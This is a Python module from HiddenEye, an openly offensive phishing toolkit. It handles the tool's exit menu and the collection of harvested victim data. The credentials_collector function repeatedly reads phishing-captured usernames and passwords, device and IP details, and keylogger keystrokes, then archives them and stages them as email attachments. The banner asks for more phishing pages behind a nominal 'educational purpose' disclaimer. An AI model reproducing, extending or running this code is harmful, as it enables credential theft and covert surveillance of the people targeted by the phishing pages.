from Defs.ThemeManager.theme import default_palette
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.EmailManager.email_prompt import captured_data_email_request
from Defs.ActionManager.Server.server_menu import server_selection

def exit_message(port):  # Message when HiddenEye exit
    choice = input(
        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'R' or choice == 'r':
        run_command('sudo python3 HiddenEye.py')
    elif choice == 'M' or choice == 'm':
        captured_data_email_request(port)
    elif choice == 'S' or choice == 's':
    	server_selection(port)
    elif choice == 'X' or choice == 'x':
        run_command('clear')
        print('''
                  {1}HIDDEN EYE {1}BY: DARKSEC TEAM
            {0}https://dark-sec-official.com
  {1}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
  {0}
     [{1}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
     [{1}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
     [{1}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
     [{1}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
     [{1}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL

  {1}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(default_palette[2], default_palette[0]))
    else:
        run_command('clear')
        return exit_message(port)

def credentials_collector(port):

    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(default_palette[0], default_palette[2], default_palette[4]))
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
                run_command("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")


        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(default_palette[2], default_palette[3], lines))
                run_command('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')

        creds.close()

        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer('{0}...............................'.format(default_palette[0]))
                log_writer(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(default_palette[3], default_palette[2], lines))
                run_command('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                log_writer('{0}...............................'.format(default_palette[0]))

        creds.close()

def log_writer(ctx):  # Writing log
    logFile = open("log.txt", "w")
    logFile.write(ctx.replace(default_palette[0], "").replace(default_palette[1], "").replace(default_palette[2], "").replace(default_palette[3], "").replace(default_palette[4], "") + "\n")
    print(ctx)
